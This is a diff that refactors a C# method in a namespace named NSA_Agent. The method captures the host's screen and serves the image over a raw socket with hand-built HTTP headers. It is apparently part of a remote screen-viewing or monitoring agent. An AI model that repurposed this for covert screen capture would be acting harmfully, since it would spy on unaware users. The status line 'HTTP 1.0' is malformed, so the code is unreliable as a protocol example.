@@ -24,31 +24,26 @@ namespace NSA_Agent
         public void run()
         {
 
-
-            String html = "hello world";
-            String line1, line2, line3, line4, headers;
-
+           
+           
+            String headers;
+            List<string> lines = new List<string>();
 
             MemoryStream memoryStream = new MemoryStream();
             
             CaptureScreenShot().Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
             
-    
             byte[] byteArray = memoryStream.ToArray();
-          
-          
 
+            lines.Add("HTTP 1.0 200 OK");
+            lines.Add("Date: " + DateTime.Now.ToLongDateString());
+            lines.Add("Content-Type: image/png");
+            lines.Add("Content-Length: " + byteArray.Length);
 
-
-            line1 = "HTTP 1.0 200 OK";
-            line2 = "Date: " + DateTime.Now.ToLongDateString();
-            line3 = "Content-Type: image/png";
-            line4 = "Content-Length: " + byteArray.Length ;
-
-            headers = line1 + "\n" + line2 + "\n" + line3 + "\n" + line4 + "\n\n";
-
+            headers = string.Join("\n", lines.ToArray());
 
             clientSocket.Send(System.Text.UTF8Encoding.UTF8.GetBytes(headers), System.Text.UTF8Encoding.UTF8.GetBytes(headers).Length, 0); //send the HTTP headers
+            clientSocket.Send(System.Text.UTF8Encoding.UTF8.GetBytes("\n\n"), System.Text.UTF8Encoding.UTF8.GetBytes("\n\n").Length, 0); 
             clientSocket.Send(byteArray); //send HTML
          
 
